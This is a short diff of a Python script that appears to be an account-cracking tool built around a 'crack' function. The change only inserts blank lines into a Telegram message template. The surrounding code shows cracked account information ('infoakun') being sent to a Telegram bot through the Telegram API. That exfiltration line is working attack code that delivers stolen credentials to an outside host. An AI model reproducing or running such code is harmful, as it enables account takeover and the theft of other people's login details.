@@ -1403,6 +1403,7 @@ def crack(idf,pwv):
 '''
 					touy8 = f'''━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━
 𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  6212016544
+
  ID tg://openmessage?user_id={ID}
  '''					
 					statusok1 = nel(statusok, style='green')
@@ -1482,6 +1483,7 @@ def crack(idf,pwv):
 '''
 					touy8 = f'''━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━
 𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°°  6212016544
+
  ID tg://openmessage?user_id={ID}
  '''					
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
